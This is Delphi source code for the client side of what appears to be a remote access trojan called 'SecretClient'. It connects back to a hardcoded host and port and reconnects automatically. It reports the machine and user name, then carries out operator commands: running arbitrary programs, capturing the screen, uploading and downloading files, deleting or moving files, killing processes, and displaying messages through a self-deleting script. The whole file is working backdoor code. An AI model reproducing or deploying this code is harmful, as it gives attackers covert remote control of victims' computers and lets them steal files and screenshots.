unit SecretClient;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, Dialogs,
  StrUtils, ScktComp, StdCtrls, ComCtrls, Spin, WinSock, ShellAPI, ExtCtrls, TlHelp32,
  JPEG, DateUtils, IdHTTP, TNTSysUtils, TNTClasses, uKBDynamic, Functions;

type
  TClientForm = class(TForm)
    ClientSocket1: TClientSocket;
    Timer1: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure ClientSocket1Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientSocket1Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ClientSocket1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

type
  TItem = record
    FileName: WideString;
    FileSize: Int64;
    FileType: DWORD;
  end;

  TItemList = array of TItem;

  TItemDB = record
    CurrentDir: WideString;
    ItemTable: TItemList
  end;

const
  HiddenProcesses: array[0..7] of String = ('', '[System Process]', 'System', 'Registry', 'Memory Compression', 'svchost.exe', 'conhost.exe', 'fontdrvhost.exe');
  MyIPAddress = '127.0.0.1';
  SocketPort = 3333;
  TIMEOUT_INTERVAL = 1500;
  PERCENT_UPDATE_INTERVAL = 500;

var
  ClientForm: TClientForm;
  FileSize: Int64 = 0;
  LoggedIn: Boolean;
  hMutex: THandle;
  OperationComplete: Boolean;
  SavedTime: TDateTime;
  FileStream: TTNTFileStream;

implementation

{$WARN SYMBOL_PLATFORM OFF}

{$R *.dfm}


//SendCommand
procedure SendCommand(SocketCommands: array of WideString; WaitFor: Boolean);
var
  MemoryStream: TMemoryStream;
  StringList: TTNTStringList;
  SavedTime: TDateTime;
  i: Integer;
begin
  StringList := TTNTStringList.Create;
  StringList.Add(BoolToStr(WaitFor, True));

  for i := 0 to Length(SocketCommands)-1 do begin
    StringList.Add(SocketCommands[i]);
  end;

  MemoryStream := TMemoryStream.Create;
  StringList.SaveToStream(MemoryStream);
  StringList.Free;
  MemoryStream.Position := 0;

  SavedTime := Now;
  OperationComplete := not WaitFor;
  ClientForm.ClientSocket1.Socket.SendStream(MemoryStream);

  while not OperationComplete do begin
    if MillisecondsBetween(SavedTime, Now) >= TIMEOUT_INTERVAL then Break;
    Wait(50);
  end;
end;
//SendCommand


//SendStream
procedure SendStream(Stream: TStream; WaitFor: Boolean);
var
  SavedTime: TDateTime;
begin
  SavedTime := Now;
  OperationComplete := not WaitFor;
  ClientForm.ClientSocket1.Socket.SendStream(Stream);

  while not OperationComplete do begin
    if MillisecondsBetween(SavedTime, Now) > TIMEOUT_INTERVAL then Break;
    Wait(50);
  end;
end;
//SendStream


//CreateList
procedure CreateList(Directory: WideString; var A: TItemDB);
var
  srSearch: TWin32FindDataW;
  hDirecotry: THandle;
begin
  SetLength(A.ItemTable, 0);
  hDirecotry := FindFirstFileW(PWideChar(Directory + '\*.*'), srSearch);

  if hDirecotry <> INVALID_HANDLE_VALUE then begin
    repeat
      if ((srSearch.dwFileAttributes and faDirectory) = 0) then begin
        SetLength(A.ItemTable, Length(A.ItemTable)+1);
        A.ItemTable[Length(A.ItemTable)-1].FileName := srSearch.cFileName;
        A.ItemTable[Length(A.ItemTable)-1].FileSize := (srSearch.nFileSizeHigh * 4294967296) + srSearch.nFileSizeLow;
        A.ItemTable[Length(A.ItemTable)-1].FileType := faAnyFile;
      end;

      if ((srSearch.dwFileAttributes and faDirectory) = faDirectory) and (WideString(srSearch.cFileName) <> '.') then begin
        SetLength(A.ItemTable, Length(A.ItemTable)+1);
        A.ItemTable[Length(A.ItemTable)-1].FileName := srSearch.cFileName;
        A.ItemTable[Length(A.ItemTable)-1].FileSize := 0;
        A.ItemTable[Length(A.ItemTable)-1].FileType := faDirectory;
      end;
    until not FindNextFileW(hDirecotry, srSearch);
    Windows.FindClose(hDirecotry);
  end;
end;
//CreateItemList


//SendDirecotry
procedure SendDirecotry(Directory: WideString);
var
  ItemDB: TItemDB;
  MemoryStream: TMemoryStream;
  lOptions: TKBDynamicOptions;
begin
  ItemDB.CurrentDir := Directory;
  CreateList(Directory, ItemDB);
  MemoryStream := TMemoryStream.Create;
  TKBDynamic.WriteTo(MemoryStream, ItemDB, TypeInfo(TItemDB), 1, lOptions);
  MemoryStream.Position := 0;

  SendCommand(['OPERATION', 'Items', IntToStr(MemoryStream.Size)], True);
  SendStream(MemoryStream, False);
end;
//SendDirecotry


//SendProcesses
procedure SendProcesses;
var
  StringList: TTNTStringList;
  MemoryStream: TMemoryStream;
  ContinueLoop: Boolean;
  SnapshotHandle: THandle;
  ProcessEntry: TProcessEntry32W;
begin
  StringList := TTNTStringList.Create;
  SnapshotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  ProcessEntry.dwSize := SizeOf(TProcessEntry32W);
  ContinueLoop := Process32FirstW(SnapshotHandle, ProcessEntry);

  while ContinueLoop do begin
    if not AnsiMatchText(ProcessEntry.szExeFile, HiddenProcesses) then StringList.Add(ProcessEntry.szExeFile);
    ContinueLoop := Process32NextW(SnapshotHandle, ProcessEntry);
  end;

  MemoryStream := TMemoryStream.Create;
  StringList.SaveToStream(MemoryStream);
  MemoryStream.Position := 0;

  SendCommand(['OPERATION', 'Processes', IntToStr(MemoryStream.Size)], True);
  SendStream(MemoryStream, False);
end;
//SendProcesses


procedure TClientForm.FormCreate(Sender: TObject);
begin
  Randomize;
  SetCurrentDir('C:\');
  ClientSocket1.Port := SocketPort;
  ClientSocket1.Address := GetIP(MyIPAddress);
  ClientSocket1.Open;

  Timer1.Enabled := True;
end;


procedure TClientForm.Timer1Timer(Sender: TObject);
begin
  if not ClientSocket1.Socket.Connected then begin
    Timer1.Enabled := False;
    LoggedIn := False;
    Wait(Random(2500));
    ClientSocket1.Close;
    ClientSocket1.Address := GetIP(MyIPAddress);
    ClientSocket1.Open;
    Timer1.Enabled := True;
  end;
end;


procedure TClientForm.ClientSocket1Connect(Sender: TObject; Socket: TCustomWinSocket);
begin
  if not LoggedIn then begin
    SendCommand(['LOGIN', ComputerName + ': ' + GetEnvironmentVariable('USERNAME')], False);
  end;

  LoggedIn := True;
end;


procedure TClientForm.ClientSocket1Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;


procedure TClientForm.FormDestroy(Sender: TObject);
begin
  Timer1.Enabled := False;

  if ClientSocket1.Socket.Connected then begin
    ClientSocket1.Socket.Close;
    Wait(500);
  end;

  Application.Terminate;
end;


//CommandMessage
procedure CommandMessage(S: WideString);
var
  StringList: TTNTStringList;
begin
  StringList := TTNTStringList.Create;
  StringList.Add('X=MsgBox("' + S + '", 0+64, "Message")');
  StringList.Add('Set objFSO = CreateObject("Scripting.FileSystemObject")');
  StringList.Add('If objFSO.FileExists(Wscript.ScriptFullName) Then objFSO.DeleteFile(Wscript.ScriptFullName)');
  StringList.SaveToFile(GetTempDirectory + 'message.vbs');
  WideWinExec(('wscript "' + GetTempDirectory + 'message.vbs"'), SW_SHOW);
  StringList.Free;
end;
//CommandMessage


//PasteCommand
procedure PasteCommand(SocketCommands: TTNTStringList);
var
  ErrorMessage: String;
  NewFileName: WideString;
begin
  NewFileName := SocketCommands[4] + '\' + WideExtractFileName(SocketCommands[3]);

  if SocketCommands[2] = 'CUT' then begin
    if WideFileExists(SocketCommands[3]) then MoveFileW(PWideChar(SocketCommands[3]), PWideChar(NewFileName));
    if WideDirectoryExists(SocketCommands[3]) then MoveDirectory(SocketCommands[3], SocketCommands[4]);
    ErrorMessage := SysErrorMessage(GetLastError);
  end;

  if SocketCommands[2] = 'COPY' then begin
    if WideFileExists(SocketCommands[3]) then CopyFileW(PWideChar(SocketCommands[3]), PWideChar(NewFileName), False);
    if WideDirectoryExists(SocketCommands[3]) then CopyDirectory(SocketCommands[3], SocketCommands[4]);
    ErrorMessage := SysErrorMessage(GetLastError);
  end;

  SendCommand(['PASTE: ' + ErrorMessage], True);
  SendDirecotry(WideGetCurrentDir);
end;
//PasteCommand


//SceenshotCommand
procedure SceenshotCommand(Percent: Integer);
var
  Bitmap: TBitmap;
  JPEGImage: TJPEGImage;
  MemoryStream: TMemoryStream;
begin
  Bitmap := TBitmap.Create;
  Bitmap.Width := GetSystemMetrics(SM_CXVIRTUALSCREEN);
  Bitmap.Height := GetSystemMetrics(SM_CYVIRTUALSCREEN);
  BitBlt(Bitmap.Canvas.Handle, 0, 0, Bitmap.Width, Bitmap.Height, GetWindowDC(GetDesktopWindow), 0, 0, SRCCOPY);

  JPEGImage := TJPEGImage.Create;
  JPEGImage.Assign(Bitmap);
  JPEGImage.CompressionQuality := Percent;
  JPEGImage.Compress;
  Bitmap.Free;

  MemoryStream := TMemoryStream.Create;
  JPEGImage.SaveToStream(MemoryStream);
  MemoryStream.Position := 0;
  JPEGImage.Free;

  SendCommand(['OPERATION', 'Screenshot', IntToStr(MemoryStream.Size)], True);
  SendStream(MemoryStream, False);
end;
//SceenshotCommand


procedure TClientForm.ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
var
  ErrorCode: Integer;
  Buffer: array [0..9999] of Char;
  IncommingLen, RecievedLen: Integer;
  SocketCommands: TTNTStringList;
  MemoryStream: TMemoryStream;
begin
  //Recive file
  if FileSize > 0 then begin
    IncommingLen := Socket.ReceiveLength;

    while IncommingLen > 0 do begin
      RecievedLen := Socket.ReceiveBuf(Buffer, SizeOf(Buffer));
      if RecievedLen <= 0 then Break else FileStream.Write(Buffer, RecievedLen);

      if (MilliSecondsBetween(SavedTime, Now) >= PERCENT_UPDATE_INTERVAL) then begin
        SendCommand(['PERCENT', Format('%.2f', [(FileStream.Size/FileSize)*100])], False);
        SavedTime := Now;
      end;

      if FileStream.Size >= FileSize then begin
        FileSize := 0;
        FileStream.Free;
        SendCommand(['PERCENT', '100'], True);
        SendDirecotry(WideGetCurrentDir);
        Break;
      end;
    end;

    Exit;
  end;

  //Recive stream
  IncommingLen := Socket.ReceiveLength;
  if IncommingLen <= 0 then Exit;
  MemoryStream := TMemoryStream.Create;

  while IncommingLen > 0 do begin
    RecievedLen := Socket.ReceiveBuf(Buffer, SizeOf(Buffer));
    if RecievedLen <= 0 then Break else MemoryStream.Write(Buffer, RecievedLen);
  end;

  //Read the stream
  MemoryStream.Position := 0;
  SocketCommands := TTNTStringList.Create;
  SocketCommands.LoadFromStream(MemoryStream);
  MemoryStream.Free;

  //Check for commands
  if SocketCommands[1] = 'DONE' then begin
    OperationComplete := True;
  end;

  if SocketCommands[1] = 'CLOSE' then begin
    FormDestroy(nil);
  end;

  if SocketCommands[1] = 'IPADDRESS' then begin
    SendCommand(['IPADDRESS', GetPublicIP], False);
  end;

  if SocketCommands[1] = 'MESSAGE' then begin
    CommandMessage(SocketCommands[2]);
  end;

  if SocketCommands[1] = 'TERMINATE' then begin
    ErrorCode := Integer(KillTask(SocketCommands[2]));
    SendCommand(['LOG', 'TERMINATE: ' + IntToStr(ErrorCode)], True);
    SendProcesses;
  end;

  if SocketCommands[1] = 'EXECUTE' then begin
    ErrorCode := WideWinExec(SocketCommands[2], StrToInt(SocketCommands[3]));
    if ErrorCode <> 0 then ErrorCode := ShellExecuteW(Handle, 'open', PWideChar(SocketCommands[2]), nil, nil, StrToInt(SocketCommands[3]));
    SendCommand(['LOG', 'EXECUTE: ' + IntToStr(ErrorCode)], False);
  end;

  if SocketCommands[1] = 'PROCESSES' then begin
    SendProcesses;
  end;

  if SocketCommands[1] = 'PASTE' then begin
    PasteCommand(SocketCommands);
  end;

  if SocketCommands[1] = 'FOLDERSIZE' then begin
    SendCommand(['FOLDERSIZE', IntToStr(GetDirectorySize(SocketCommands[2]))], False);
  end;

  if SocketCommands[1] = 'OPENITEM' then begin
    if WideSetCurrentDir(SocketCommands[2]) then SendDirecotry(WideGetCurrentDir);
  end;

  if SocketCommands[1] = 'UPDATEFOLDER' then begin
    SendDirecotry(WideGetCurrentDir);
  end;

  if SocketCommands[1] = 'CREATEFOLDER' then begin
    CreateDirectoryW(PWideChar(SocketCommands[2]), nil);
    SendCommand(['LOG', 'CREATEFOLDER: ' + SysErrorMessage(GetLastError)], True);
    SendDirecotry(WideGetCurrentDir);
  end;

  if SocketCommands[1] = 'RENAME' then begin
    MoveFileW(PWideChar(SocketCommands[2]), PWideChar(SocketCommands[3]));
    SendCommand(['LOG', 'RENAME: ' + SysErrorMessage(GetLastError)], True);
    SendDirecotry(WideGetCurrentDir);
  end;

  if SocketCommands[1] = 'DELETE' then begin
    if WideFileExists(SocketCommands[2]) then DeleteFileW(PWideChar(SocketCommands[2]));
    if WideDirectoryExists(SocketCommands[2]) then DeleteDirectory(SocketCommands[2]);
    SendCommand(['LOG', 'DELETE: ' + SysErrorMessage(GetLastError)], True);
    SendDirecotry(WideGetCurrentDir);
  end;

  if SocketCommands[1] = 'SCREENSHOT' then begin
    SceenshotCommand(StrToInt(SocketCommands[2]));
  end;

  if SocketCommands[1] = 'UPLOAD' then begin
    FileStream := TTNTFileStream.Create(SocketCommands[2], fmCreate or fmOpenWrite);
    FileSize := StrToInt64(SocketCommands[3]);
    SavedTime := Now;
  end;

  if SocketCommands[1] = 'DOWNLOAD' then begin
    FileStream := TTNTFileStream.Create(SocketCommands[2], fmOpenRead);
    SendCommand(['OPERATION', 'Download', IntToStr(FileStream.Size)], True);
    SendStream(FileStream, False);
  end;

  if SocketCommands[0] = 'True' then SendCommand(['DONE'], False);
end;


procedure TClientForm.ClientSocket1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  if ClientSocket1.Socket.Connected then begin
    SendCommand(['CLOSE', ComputerName + ': ' + GetEnvironmentVariable('USERNAME')], False);
  end;
end;


end.
